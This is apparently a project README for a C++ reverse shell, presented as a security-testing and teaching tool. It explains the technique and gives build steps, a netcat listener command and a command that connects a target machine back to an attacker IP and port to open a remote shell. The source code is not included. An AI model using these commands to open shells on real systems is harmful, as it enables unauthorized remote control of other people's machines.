# Reverse Shell in C++

Welcome to the repository for my Reverse Shell project written in C++. This project demonstrates how to create a reverse shell, a powerful tool for network security testing and educational purposes.

## What is a Reverse Shell?

A reverse shell is a type of shell where the target machine connects back to the attacker's machine. This can be useful in scenarios where the target machine is behind a firewall or NAT and cannot accept incoming connections. Instead, it initiates an outgoing connection to the attacker's machine, allowing the attacker to gain control.
 
## Features

- **Lightweight and Efficient**: The reverse shell is designed to be lightweight and efficient, ensuring minimal resource usage on the target machine.
- **Cross-Platform**: Written in C++, it can be compiled and run on various platforms including Windows, Linux, and macOS.
- **Encrypted Communication**: Ensures that the data transferred between the attacker and the target machine is encrypted.

## How to Build

1. **Clone the Repository**:
    ```bash
   git clone https://github.com/yourusername/reverse-shell-cpp.git
   cd reverse-shell-cpp
    ```
Install Dependencies:
Ensure you have a C++ compiler installed (like g++, clang, or MSVC). For example, on Ubuntu, you can install g++ with:

```bash

sudo apt-get install g++

Compile the Code:

g++ -o reverse_shell reverse_shell.cpp
```
For Windows, you might use:

```bash

    cl /EHsc reverse_shell.cpp
```
- How to Use

    Start a Listener on the Attacker Machine:
    You can use netcat to start a listener. For example:

    ``` bash
    nc -lvp 4444
   ```

Run the Reverse Shell on the Target Machine:
Ensure the target machine can reach the attacker's IP and port. Run the compiled reverse_shell executable:

```bash

./reverse_shell <attacker_ip> <port>
```
For example:

```bash

    ./reverse_shell 192.168.1.10 4444
```

  Establish Connection:
  Once the reverse shell is executed on the target machine, it will connect back to the attacker's machine, providing a command line interface to the attacker.
